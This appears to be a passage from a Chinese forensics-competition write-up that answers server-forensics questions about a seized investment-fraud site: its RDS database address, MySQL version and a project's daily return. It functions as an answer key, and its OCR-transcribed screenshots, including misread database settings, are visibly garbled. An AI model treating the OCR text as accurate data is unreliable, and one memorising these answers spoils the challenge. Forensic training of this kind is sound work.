LOPCSUEEMN)68R91578HK).RWLB.GDS.ALIYUNGS.CCM DB HOSI-PO-U DB PORT-3806 DB DATAENSE VIPLICA1 DBUSERNAHY SOS 15 DB PAS3NORO-EC14933939002DOC BRORDCAST DRIVER-LOG CACHEDRIVER-ELLE 18 QUEUE CONKECTION-OYNC MAN SESSION DRIVER-EILE 23 24 25 REDTS PORT-6379 27 11 HOST-ONCP.MAILTRAP.10 29 30 TL USERNAME-NULL HATL PASSSORD NULL POS:159 LN:6 NORMAL TEXT HILE 工只箱 16核心CPU 温4-203230825-184431/X1件系GENTOSINALUNNROOTLLOGKUN/EITLOGKUNNROOTLLOGKUN/EITARNNROOTN9/LCALCOM/EIT/ENT 版本:R7.1.5.SP2 内存  15.0G/7.0G -->


```plain
【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]
pc-uf6mmj68r91f78hkj.rwlb.rds.aliyuncs.com
```

<!-- 这是一张图片，ocr 内容为：盘古石计算机取证分析系统 AA 全部 任务中心 自 导出 取证 日酒 案件列表 闻 打开父日录 计算哈希值 展开复合文件 特征分析 复制单元格文本 导出文件 复制全路径 添加书签 导出列表 标记 PROC 图丰 音视频库 MYSQL 检材文件 ROOT 全洗(0/14): 显示列 RUN STV 经大小 扩展名 以最后访问时间 MD5 应用分析 物理大小 办 创建时间 删除状态 惨改时间 SHA256 名称 SYS 晶 10 RPM.PL 未删除 11 B(11) 4 KB(4096) 2023-06-19 16:52+08 2023-06-19 16:52 08 PL TMP USR 2022-12-01 07:14+08 0.8(Q) 2023-06-1916:36:29+08 未删除 4 MB(4284030) SHARE 按爱结果 X ARSTHK/APPDATALLOCALLTEMPLUERSIONPL-NOTEPADE + [ADMINISTRATOD SETTINGS TOOLS MACRE RUN PLUGINS WINDOW 7 标签条目 INDES PIG 日 VERSION.P18 PACKAZES PHPBR 书益 工只箱 16核心CPU 宽件:20230826-18M31/文件系统/CENTOSNTOSNEGROUP//ROOTFL ODKANN/SERSIONN//VERSIONN/SER/SER/NJYSAL/VERSION.OL 版本:R7.1.5P2 内存  15.0G/7.0G -->


```plain
【服务器取证】请给出涉网网站数据库版本号? [答题格式: 5.6.00]
5.7.40
```

导出WWW挂载拟真服务器，前台

<!-- 这是一张图片，ocr 内容为：项目分类栏目 项目状态 贵州六盘水市风力发电基灵 查询 添加 批量删除 操 日期 起投金额 交易收益 项目规模 投资进度 分类 项目期限 项目标题 排序 投资状态 项目展示 保理机构 首页展示 作 中国平安保 贵州六盘 2021-07- 水市风力 险(集团) 7个自然 2000000 4.00 首页隐 进行中 项目展 89.00 7000.00 VIP专区 14 08:49: 日 发电基建 股份有限公 20 工程 司 下一页 -->


```plain
【服务器取证】投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]
4.00%
```

